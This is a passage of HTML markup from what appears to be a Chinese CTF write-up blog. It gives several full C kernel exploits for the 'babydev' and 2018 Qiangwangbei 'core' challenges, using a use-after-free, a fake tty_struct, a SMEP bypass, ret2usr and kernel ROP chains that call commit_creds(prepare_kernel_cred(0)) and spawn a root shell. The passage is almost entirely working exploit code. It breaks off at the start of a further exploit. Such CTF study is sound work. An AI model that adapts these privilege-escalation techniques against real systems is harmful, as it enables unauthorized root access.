class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> id = fork();</span><br><span class="line">    <span class="keyword">if</span>(id &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]fork error!!!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(id == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,buf,<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:)]root now!!!"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p><code>By pass Smep</code> &amp; <code>ret2usr</code></p>
<h2 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4 = <span class="number">0xFFFFFFFF810635B4</span>; <span class="comment">//mov cr4,rdi;pop rbp;retn; </span></span><br><span class="line">    <span class="keyword">size_t</span> mov_rsp = <span class="number">0xFFFFFFFF8181BFC5</span>; <span class="comment">//mov rsp,rax;dec ebx;ret;</span></span><br><span class="line">    <span class="keyword">size_t</span> swapgs = <span class="number">0xffffffff81063694</span>; <span class="comment">//swapgs;pop rbp;ret;</span></span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi = <span class="number">0xffffffff810d238d</span>; <span class="comment">//pop rdi;ret;</span></span><br><span class="line">    <span class="keyword">size_t</span> iretq = <span class="number">0xffffffff814e35ef</span>; <span class="comment">//iretq;ret;</span></span><br><span class="line">    <span class="keyword">size_t</span> pop_rsp = <span class="number">0xffffffff81171045</span>; <span class="comment">//pop rsp;ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> ropchain[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = pop_rdi;</span><br><span class="line">    ropchain[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    ropchain[i++] = mov_cr4;</span><br><span class="line">    ropchain[i++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    ropchain[i++] = swapgs;</span><br><span class="line">    ropchain[i++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = iretq;</span><br><span class="line">    ropchain[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    ropchain[i++] = user_cs;</span><br><span class="line">    ropchain[i++] = user_rflags;</span><br><span class="line">    ropchain[i++] = user_rsp;</span><br><span class="line">    ropchain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_operations[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = pop_rsp;</span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)ropchain;</span><br><span class="line">    fake_tty_operations[<span class="number">7</span>] = mov_rsp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">"/dev/ptmx"</span>,<span class="number">2</span>);</span><br><span class="line">    read(fd2,fake_tty_struct,<span class="number">0x20</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">    write(fd2,fake_tty_struct,<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty,buf,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2018强网杯-core："><a href="#2018强网杯-core：" class="headerlink" title="2018强网杯_core："></a>2018强网杯_core：</h1><h2 id="解法一：-1"><a href="#解法一：-1" class="headerlink" title="解法一："></a>解法一：</h2><p><code>kernel space ROP</code></p>
<h2 id="exp：-2"><a href="#exp：-2" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(fp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"[:(]Open kallsyms error!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, fp))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds_addr &amp; prepare_kernel_cred_addr)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds_addr)&#123;</span><br><span class="line">            <span class="keyword">char</span> addr1[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr1,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr1,<span class="string">"%llx"</span>,&amp;commit_creds_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]commit_creds addr = %p\n"</span>,commit_creds_addr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred_addr)&#123;</span><br><span class="line">            <span class="keyword">char</span> addr2[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr2,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr2,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]prepare_kernel_cred addr = %p\n"</span>,prepare_kernel_cred_addr);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred_addr - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]vmlinux_base = %p\n"</span>,vmlinux_base);                </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(commit_creds_addr &amp; prepare_kernel_cred_addr))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Don't find!!!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_ss,user_cs,user_rflags,user_rsp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Status has been saved!!!"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]get root failed..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_offset</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">size_t</span> offset)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,offset);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Set offset!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> buf[])</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Read!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">signed</span> <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Copy_data!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    get_symbols();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open /proc/core failed!!!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_offset(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    Read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = *(<span class="keyword">size_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Canary = %llx\n"</span>,canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> ropchain[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi = vmlinux_base + (<span class="number">0xffffffff81000b2f</span><span class="number">-0xffffffff81000000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> mov_call = vmlinux_base + (<span class="number">0xffffffff8101aa6a</span><span class="number">-0xffffffff81000000</span>); <span class="comment">//0xffffffff8101aa6a: mov rdi, rax; call rdx; </span></span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx = vmlinux_base + (<span class="number">0xffffffff810a0f49</span><span class="number">-0xffffffff81000000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> pop_rcx = vmlinux_base + (<span class="number">0xffffffff81021e53</span><span class="number">-0xffffffff81000000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> swapgs = vmlinux_base + (<span class="number">0xffffffff81a012da</span><span class="number">-0xffffffff81000000</span>); <span class="comment">//: swapgs; popfq; ret;</span></span><br><span class="line">    <span class="keyword">size_t</span> iretq = vmlinux_base + (<span class="number">0xffffffff81050ac2</span><span class="number">-0xffffffff81000000</span>); <span class="comment">//: iretq; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">        ropchain[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ropchain[i++] = canary;</span><br><span class="line">    ropchain[i++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = pop_rdi;</span><br><span class="line">    ropchain[i++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = prepare_kernel_cred_addr;</span><br><span class="line"></span><br><span class="line">    ropchain[i++] = pop_rdx;</span><br><span class="line">    ropchain[i++] = pop_rcx;</span><br><span class="line">    ropchain[i++] = mov_call;</span><br><span class="line">    ropchain[i++] = commit_creds_addr;</span><br><span class="line"></span><br><span class="line">    ropchain[i++] = swapgs;</span><br><span class="line">    ropchain[i++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = iretq;</span><br><span class="line"></span><br><span class="line">    ropchain[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    ropchain[i++] = user_cs;</span><br><span class="line">    ropchain[i++] = user_rflags;</span><br><span class="line">    ropchain[i++] = user_rsp;</span><br><span class="line">    ropchain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd,ropchain,<span class="number">0x800</span>);</span><br><span class="line">    copy_func(fd,<span class="number">0xffffffffffff0000</span>|<span class="number">0x0100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(p.sym['commit_creds']-0xffffffff81000000)</span></span><br><span class="line"><span class="comment">'0x9c8e0'</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(p.sym['prepare_kernel_cred']-0xffffffff81000000)</span></span><br><span class="line"><span class="comment">'0x9cce0'</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="解法二：-1"><a href="#解法二：-1" class="headerlink" title="解法二："></a>解法二：</h2><p><code>ret2usr</code></p>
<h2 id="exp：-3"><a href="#exp：-3" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 